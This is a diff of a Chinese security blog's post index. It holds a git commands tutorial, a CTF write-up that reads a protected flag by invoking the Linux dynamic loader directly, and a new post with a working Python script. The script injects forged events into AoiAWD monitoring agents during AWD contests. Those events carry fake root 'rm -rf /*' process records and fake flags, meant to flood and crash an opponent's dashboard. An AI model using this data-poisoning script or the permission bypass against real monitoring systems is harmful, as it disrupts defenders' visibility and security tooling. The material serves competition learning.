-<h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>git commit 命令将暂存区内容添加到本地仓库中。<br>提交暂存区到本地仓库中:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token punctuation">[</span>message<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>[message] 可以是一些备注信息。</p>
-<h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p>git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。</p>
-<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>git rm 命令用于删除文件。<br>如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。</p>
-<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>git mv 命令用于移动或重命名一个文件、目录或软连接。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token punctuation">[</span>newfile<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> <span class="token parameter variable">-f</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token punctuation">[</span>newfile<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h1><h2 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h2><p>显示所有远程仓库：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h2><p>git pull 命令用于从远程获取代码并合并本地的版本。 </p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull <span class="token operator">&lt;</span>远程主机名<span class="token operator">></span> <span class="token operator">&lt;</span>远程分支名<span class="token operator">></span>:<span class="token operator">&lt;</span>本地分支名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>git push 命用于从将本地的分支版本上传到远程并合并。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push <span class="token operator">&lt;</span>远程主机名<span class="token operator">></span> <span class="token operator">&lt;</span>本地分支名<span class="token operator">></span>:<span class="token operator">&lt;</span>远程分支名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow黑盒测试</title>
     <url>/2023/07/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<h1 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h1><p>先看源码没发现啥</p>
@@ -794,6 +800,38 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       </tags>
   </entry>
   <entry>
+    <title>git命令</title>
+    <url>/2023/07/git/</url>
+    <content><![CDATA[<h1 id="创建仓库命令"><a href="#创建仓库命令" class="headerlink" title="创建仓库命令"></a>创建仓库命令</h1><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>git init 命令用于在目录中创建新的 Git 仓库。<br>在文件夹中，会被创建出一个.git的一个隐藏文件，这时，本地库已经初始化完成.</p>
+<h2 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h2><p>git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。<br>拷贝项目命令格式如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="提交与修改"><a href="#提交与修改" class="headerlink" title="提交与修改"></a>提交与修改</h1><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>git add 命令可将该文件添加到暂存区。</p>
+<p>添加一个或多个文件到暂存区</p>
+<h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>git commit 命令将暂存区内容添加到本地仓库中。<br>提交暂存区到本地仓库中:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token punctuation">[</span>message<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>[message] 可以是一些备注信息。</p>
+<h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p>git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。</p>
+<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>git rm 命令用于删除文件。<br>如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。</p>
+<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>git mv 命令用于移动或重命名一个文件、目录或软连接。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token punctuation">[</span>newfile<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> <span class="token parameter variable">-f</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token punctuation">[</span>newfile<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h1><h2 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h2><p>显示所有远程仓库：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h2><p>git pull 命令用于从远程获取代码并合并本地的版本。 </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull <span class="token operator">&lt;</span>远程主机名<span class="token operator">></span> <span class="token operator">&lt;</span>远程分支名<span class="token operator">></span>:<span class="token operator">&lt;</span>本地分支名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>git push 命用于从将本地的分支版本上传到远程并合并。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push <span class="token operator">&lt;</span>远程主机名<span class="token operator">></span> <span class="token operator">&lt;</span>本地分支名<span class="token operator">></span>:<span class="token operator">&lt;</span>远程分支名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hackthebox合集</title>
     <url>/2023/07/htb/</url>
     <content><![CDATA[<p>共做出三道题，前两道题wp正在补，但现在又有点想转去做vulnhub</p>
@@ -857,6 +895,42 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       <tags>
         <tag>web</tag>
         <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux动态加载</title>
+    <url>/2023/07/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[<h2 id="linux动态加载"><a href="#linux动态加载" class="headerlink" title="linux动态加载"></a>linux动态加载</h2><h1 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h1><p>先给了755<br>他自己传了flag 等于告诉我们在哪了<br>然后限到了644<br>不想让我们直接看</p>
+<blockquote>
+<p>都到这一题了权限应该不用讲了</p>
+</blockquote>
+<p>提示给了shell<br>且不需要提权<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
+<h1 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h1><h2 id="elf文件"><a href="#elf文件" class="headerlink" title="elf文件"></a>elf文件</h2><p>elf文件是linux下的可执行文件<br>文件头为elf</p>
+<blockquote>
+<p>不知道是靶机还是蚁剑虚拟终端的问题 没法vi<br>直接cat就能看到了</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<h2 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h2><ul>
+<li>当需要动态链接的应用被操作系统加载时</li>
+<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
+<li>在Linux环境下，这项工作是由ld-linux.so.2来负责完成的</li>
+<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
+<li>而不是交给程序正常的进入地址</li>
+<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
+</ul>
+<h2 id="ldd命令"><a href="#ldd命令" class="headerlink" title="ldd命令"></a>ldd命令</h2><p>使用ldd命令即可查看<br>简便的shell命令依赖哪些动态加载库<br><img src= "/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
+<h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><p>在cat elf文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在ldd<br>可以看到ls 和 cat动用他了<br>用！<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 &#x2F;readflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>get</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>linux</tag>
+        <tag>动态加载</tag>
       </tags>
   </entry>
   <entry>
@@ -958,42 +1032,6 @@ sig <span class="token operator">=</span> base64<span class="token punctuation">
       </tags>
   </entry>
   <entry>
-    <title>linux动态加载</title>
-    <url>/2023/07/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
-    <content><![CDATA[<h2 id="linux动态加载"><a href="#linux动态加载" class="headerlink" title="linux动态加载"></a>linux动态加载</h2><h1 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h1><p>先给了755<br>他自己传了flag 等于告诉我们在哪了<br>然后限到了644<br>不想让我们直接看</p>
-<blockquote>
-<p>都到这一题了权限应该不用讲了</p>
-</blockquote>
-<p>提示给了shell<br>且不需要提权<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
-<h1 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h1><h2 id="elf文件"><a href="#elf文件" class="headerlink" title="elf文件"></a>elf文件</h2><p>elf文件是linux下的可执行文件<br>文件头为elf</p>
-<blockquote>
-<p>不知道是靶机还是蚁剑虚拟终端的问题 没法vi<br>直接cat就能看到了</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<h2 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h2><ul>
-<li>当需要动态链接的应用被操作系统加载时</li>
-<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
-<li>在Linux环境下，这项工作是由ld-linux.so.2来负责完成的</li>
-<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
-<li>而不是交给程序正常的进入地址</li>
-<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
-</ul>
-<h2 id="ldd命令"><a href="#ldd命令" class="headerlink" title="ldd命令"></a>ldd命令</h2><p>使用ldd命令即可查看<br>简便的shell命令依赖哪些动态加载库<br><img src= "/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
-<h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><p>在cat elf文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在ldd<br>可以看到ls 和 cat动用他了<br>用！<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 &#x2F;readflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>get</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>linux</tag>
-        <tag>动态加载</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>福清核电-关基测试</title>
     <url>/2023/07/test-s1rius/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -1014,6 +1052,83 @@ sig <span class="token operator">=</span> base64<span class="token punctuation">
       <tags>
         <tag>内网</tag>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AoiAWD反制脚本</title>
+    <url>/2024/05/untiAoi/</url>
+    <content><![CDATA[<h1 id="AoiAWD-反制脚本"><a href="#AoiAWD-反制脚本" class="headerlink" title="AoiAWD 反制脚本"></a>AoiAWD 反制脚本</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)</p>
+<p>赛后研究了一下</p>
+<p>开发了这个反制脚本</p>
+<p>由于打点队友喜欢用 gogo</p>
+<p>所以这个脚本支持 gogo 扫描结果</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>发现后端未验证来自靶机的数据</p>
+<p>因此存在脏数据污染</p>
+<p>针对此开发脚本</p>
+<p>可向 AoiAWD 的各个数据展示页面投放脏数据</p>
+<p>包括告警页面</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> socket
+
+f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./ip.txt"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span>
+url_list <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> url_list<span class="token punctuation">:</span>
+    pattern <span class="token operator">=</span> <span class="token string">r"tcp://(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;:\d+)"</span>
+    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"//"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+        p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        i <span class="token operator">=</span> i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        server_address <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> p<span class="token punctuation">)</span>  <span class="token comment"># 替换SERVER_IP和SERVER_PORT为实际值</span>
+        data <span class="token operator">=</span> <span class="token string">'&#123;"type":"ping"&#125;\n'</span>
+        data2 <span class="token operator">=</span> <span class="token string">'&#123;"type":"new_process","data":&#123;"pid":"114514","ppid":"114514","uid":"0","username":"root","cmd":"rm -rf /*","param":"su root rm -rf /*"&#125;&#125;\n'</span>
+        data3 <span class="token operator">=</span> <span class="token string">'&#123;"type":"file","data":&#123;"path":"/update/score_points","mode":33188,"event":256,"size":114514,"content":"ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0="&#125;&#125;\n'</span>
+        data4 <span class="token operator">=</span> <span class="token string">'&#123;"type":"web","data":&#123;"scipt":"/var/www/html/rce.php","method":"post","uri":"127.0.0.1/rce.php","remote":"127.0.0.1","buffer":"&#123;\\"flag\\":\\"flag&#123;Crazy_Thurthday_v_me_50&#125;\\"&#125;"&#125;&#125;\n'</span>
+        data5 <span class="token operator">=</span> <span class="token string">'&#123;"type":"pwn","data":&#123;"file":"catflag","type":"stdin","pid":"123","maps":"su root rm -rf /*"&#125;&#125;\n'</span>
+        data6 <span class="token operator">=</span> <span class="token string">'&#123;"type":"pwn","data":&#123;"file":"catflag","type":"stdin","pid":"123","maps":"su root rm -rf /*"&#125;&#125;\n'</span>
+        data7 <span class="token operator">=</span> <span class="token string">'&#123;"type":"file","data":&#123;"path":"/114514","mode":33188,"event":256,"size":114514,"content":"c3Ugcm9vdCBybSAtcmYgLyo="&#125;&#125;\n'</span>
+        <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> sock<span class="token punctuation">:</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+                sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server_address<span class="token punctuation">)</span>
+                sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                tmp <span class="token operator">=</span> sock<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token string">"pong"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data3<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data4<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data7<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data6<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>
+                    sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">else</span><span class="token punctuation">:</span>
+                    <span class="token keyword">print</span><span class="token punctuation">(</span>
+                        <span class="token string-interpolation"><span class="token string">f"\n[-] --------------------------------</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">-------------------------------------\n"</span></span>
+                    <span class="token punctuation">)</span>
+            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"An error occurred: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h2><p>由于分析了各个 AWD 防御工具(Aoi、wathbird 等)</p>
+<p>决定模仿 aoi、并借鉴其他各个工具</p>
+<p>重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统</p>
+<p>但是目前没有时间开发(<del>别问，问就是鸽</del>)</p>
+<p><del>预计会在 2025 年 5 月问世</del> ：)</p>
+<p>如果师傅们有留存的各个 AWD 比赛的流量等数据</p>
+<p>以及分析了解过官方 check 机制的师傅</p>
+<p>以及有大量参加 AWD 经验的大师傅</p>
+<p>欢迎联系本菜鸡</p>
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>AoiAWD</tag>
+        <tag>反制脚本</tag>
       </tags>
   </entry>
   <entry>
